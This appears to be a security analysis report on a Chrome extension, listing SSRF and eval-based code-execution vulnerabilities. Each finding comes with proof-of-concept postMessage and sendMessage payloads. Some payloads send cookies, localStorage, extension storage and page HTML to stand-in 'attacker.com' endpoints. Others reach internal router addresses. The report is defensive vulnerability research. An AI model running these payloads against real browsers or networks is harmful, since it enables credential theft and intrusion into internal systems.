# CoCo Analysis: pjilhejlknnknaafmebjgohibhkcbabf

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 10 (2 fetch_resource_sink, 2 sendResponseExternal_sink, 6 eval_sink across multiple content scripts)

---

## Sink 1: bg_chrome_runtime_MessageExternal → fetch_resource_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/pjilhejlknnknaafmebjgohibhkcbabf/opgen_generated_files/bg.js
Line 1128			case 'sendGetRequest': js_actions.sendGetRequest(request.url, sendResponse, request.headers); break;
	request.url
```

**Code:**

```javascript
// Background script (bg.js) - Lines 1126-1138
const messagesListener = function(request, sender, sendResponse){
	switch(request.action){
		case 'sendGetRequest': js_actions.sendGetRequest(request.url, sendResponse, request.headers); break; // <- attacker-controlled URL
		case 'sendPostRequest': js_actions.sendPostRequest(request, sendResponse); break;
		case 'getGlobalData': js_actions.getGlobalData(sendResponse); break;
		case 'checkExtension': js_actions.checkExtension(sendResponse); break;
	}
	return true;
};

chrome.runtime.onMessage.addListener(messagesListener);// Для внутренних месседжей
chrome.runtime.onMessageExternal.addListener(messagesListener);// Для внешних месседжей (External messages)

// Lines 1040-1054
sendGetRequest: function (url, callback, headers = {}) {
	fetch(url, { // SINK: attacker controls URL and headers
		method: 'GET',
		headers: headers // <- attacker-controlled headers
	})
		.then(response => response.text())
		.then(text => {
			try {
				return JSON.parse(text);
			} catch(err) {
				return text;
			}
		}).then(function(response){
			callback(response); // Response sent back to attacker via sendResponse
		});
},
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From any of the whitelisted domains (Amazon, Walmart, sellertoolset.com, etc.)
// Note: Per CRITICAL ANALYSIS RULE 1, we IGNORE externally_connectable restrictions.
// If even ONE domain can exploit it, it's a TRUE POSITIVE.

chrome.runtime.sendMessage(
    'pjilhejlknnknaafmebjgohibhkcbabf',
    {
        action: 'sendGetRequest',
        url: 'http://internal-network/admin/api',
        headers: {
            'Authorization': 'Bearer stolen-token',
            'X-Custom': 'malicious'
        }
    },
    function(response) {
        // Attacker receives response from internal network
        console.log('Internal data:', response);
    }
);
```

**Impact:** Server-Side Request Forgery (SSRF) allowing attacker to make the extension perform privileged cross-origin GET requests to arbitrary URLs with custom headers. Combined with Sink 2, this creates a complete SSRF + information disclosure chain where the attacker can:
1. Access internal network resources
2. Receive the response back via sendResponse
3. Exfiltrate sensitive data from otherwise inaccessible endpoints

---

## Sink 2: fetch_source → sendResponseExternal_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/pjilhejlknnknaafmebjgohibhkcbabf/opgen_generated_files/bg.js
Line 265	    var responseText = 'data_from_fetch';
	responseText = 'data_from_fetch'
```

**Code:**

```javascript
// Same flow as Sink 1 - the fetch response is sent back to external caller
sendGetRequest: function (url, callback, headers = {}) {
	fetch(url, {
		method: 'GET',
		headers: headers
	})
		.then(response => response.text())
		.then(text => {
			try {
				return JSON.parse(text);
			} catch(err) {
				return text;
			}
		}).then(function(response){
			callback(response); // SINK: sends fetch result to external caller
		});
},
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// Attacker requests sensitive data from internal endpoints
chrome.runtime.sendMessage(
    'pjilhejlknnknaafmebjgohibhkcbabf',
    {
        action: 'sendGetRequest',
        url: 'http://192.168.1.1/admin/config', // Internal router admin
        headers: {}
    },
    function(response) {
        // Attacker receives internal configuration
        fetch('https://attacker.com/exfil', {
            method: 'POST',
            body: JSON.stringify(response)
        });
    }
);
```

**Impact:** Information disclosure - fetch responses (including sensitive data from internal networks or privileged endpoints) are sent back to the external attacker. Combined with SSRF (Sink 1), this enables complete data exfiltration from internal resources.

---

## Sink 3: cs_window_eventListener_message → eval_sink (Code Execution - action: 'eval')

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/pjilhejlknnknaafmebjgohibhkcbabf/opgen_generated_files/cs_0.js
Line 487	window.addEventListener("message", function(event){
	event
Line 489			const message = JSON.parse(event.data);
	event.data
Line 489			const message = JSON.parse(event.data);
	JSON.parse(event.data)
Line 492				chrome.tabs.create({ url: message.data }).catch(error => {
	message.data
```

**Code:**

```javascript
// Content script (cs_0.js) - Lines 487-496
// Обработчик postMessage (принимает запросы с окна iframe и с сайта)
window.addEventListener("message", function(event){
	try {
		const message = JSON.parse(event.data); // <- attacker-controlled

		if(message.action === 'openLink') {
			chrome.tabs.create({ url: message.data }).catch(error => {
				console.error('Error opening link tab:', error);
			});
		} else if(message.action === 'eval') {
			eval(message.data); // SINK: Direct eval of attacker-controlled code!
		}
		// ... more code
	} catch(err) {}
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage (DOM event)

**Attack:**

```javascript
// From any webpage where the content script runs (Amazon, Walmart, etc.)
// Note: Per CRITICAL ANALYSIS RULE 1, we IGNORE content_scripts matches restrictions.
// If window.addEventListener("message") exists, assume ANY attacker can trigger it.

window.postMessage(JSON.stringify({
    action: 'eval',
    data: 'alert(document.cookie)' // Arbitrary code execution!
}), "*");

// More dangerous - steal all cookies and send to attacker
window.postMessage(JSON.stringify({
    action: 'eval',
    data: 'fetch("https://attacker.com/steal", {method: "POST", body: JSON.stringify({cookies: document.cookie, localStorage: localStorage})})'
}), "*");

// Execute arbitrary actions with extension privileges
window.postMessage(JSON.stringify({
    action: 'eval',
    data: 'chrome.storage.sync.get(null, (data) => fetch("https://attacker.com/exfil", {method: "POST", body: JSON.stringify(data)}))'
}), "*");
```

**Impact:** CRITICAL - Arbitrary JavaScript code execution in the context of the content script with extension privileges. Attacker can:
1. Access extension storage
2. Execute any extension APIs available to content scripts
3. Steal cookies, localStorage, and other sensitive page data
4. Perform actions on behalf of the user
5. Manipulate the DOM with extension privileges

---

## Sink 4: cs_window_eventListener_message → eval_sink (Code Execution - action: 'evalParent')

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/pjilhejlknnknaafmebjgohibhkcbabf/opgen_generated_files/cs_0.js
Line 487	window.addEventListener("message", function(event){
	event
Line 489			const message = JSON.parse(event.data);
	event.data
Line 489			const message = JSON.parse(event.data);
	JSON.parse(event.data)
Line 513			            const res = eval('(' + decodeURI(message.func) + ')();');
	message.func
Line 513			            const res = eval('(' + decodeURI(message.func) + ')();');
	decodeURI(message.func)
Line 513			            const res = eval('(' + decodeURI(message.func) + ')();');
	eval('(' + decodeURI(message.func) + ')();')
```

**Code:**

```javascript
// Content script (cs_0.js) - Lines 487-514
window.addEventListener("message", function(event){
	try {
		const message = JSON.parse(event.data); // <- attacker-controlled

		// ... other actions ...

		// Выполнение кода в родительском окне, с возвратом результата
		} else if(message.action === 'evalParent') {
			try {
				(function(){
					const data = message.data;// Входной объект данных (attacker-controlled)

					// Функция используется для возврата результата в колбэк
					function returnRes(resData){
						const wind = !!document.getElementById('iframe-sellertoolset') ? document.getElementById('iframe-sellertoolset').contentWindow : window;
						wind.postMessage(JSON.stringify({
							action: 'evalResponse',
							data: resData,
							hash: message.hash
						}), "*");
					}

		            const res = eval('(' + decodeURI(message.func) + ')();'); // SINK: eval with attacker-controlled function
				})();
			} catch(err) {}
		}
	} catch(err) {}
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage (DOM event)

**Attack:**

```javascript
// From any webpage where content script runs
window.postMessage(JSON.stringify({
    action: 'evalParent',
    func: encodeURI('function() { fetch("https://attacker.com/steal", {method: "POST", body: document.body.innerHTML}); return "stolen"; }'),
    data: {},
    hash: 'attack123'
}), "*");

// More sophisticated - steal Amazon credentials
window.postMessage(JSON.stringify({
    action: 'evalParent',
    func: encodeURI('function() { var creds = {cookies: document.cookie, html: document.documentElement.outerHTML}; fetch("https://attacker.com/amazon-creds", {method: "POST", body: JSON.stringify(creds)}); returnRes(creds); }'),
    data: {},
    hash: 'steal'
}), "*");
```

**Impact:** CRITICAL - Another arbitrary code execution vector. This variant:
1. Executes arbitrary JavaScript via eval
2. Provides a callback mechanism (returnRes) to send results back to attacker
3. Has access to the page context and extension privileges
4. Can exfiltrate data and receive confirmation of success

This is even more dangerous as it provides bi-directional communication for the attack.

---

## Sink 5-10: Same eval_sink pattern in cs_1.js and cs_3.js

**Code:**

The same vulnerable window.postMessage handlers with eval sinks exist in:
- cs_1.js (Lines 487-513) - identical to cs_0.js
- cs_3.js (Lines 487-513) - identical to cs_0.js

These are injected into different sets of matching URLs as defined in manifest.json content_scripts.

**Classification:** TRUE POSITIVE (for all)

**Attack Vector:** window.postMessage (DOM event)

**Impact:** Same critical code execution vulnerabilities across multiple content scripts, expanding the attack surface to all matched domains (Amazon, Walmart, sellertoolset.com domains).

---

## Overall Assessment

This extension has **CRITICAL vulnerabilities**:

1. **SSRF with Information Disclosure** (Sinks 1-2): External messages can trigger arbitrary fetch requests with custom headers, and responses are sent back to attacker
2. **Multiple Code Execution Paths** (Sinks 3-10): Direct eval of attacker-controlled code via window.postMessage in multiple content scripts

The combination of these vulnerabilities allows:
- Complete compromise of the extension's security model
- Arbitrary code execution in extension context
- SSRF attacks against internal networks with data exfiltration
- Theft of cookies, credentials, and sensitive user data
- Manipulation of Amazon, Walmart, and other e-commerce sites on behalf of users
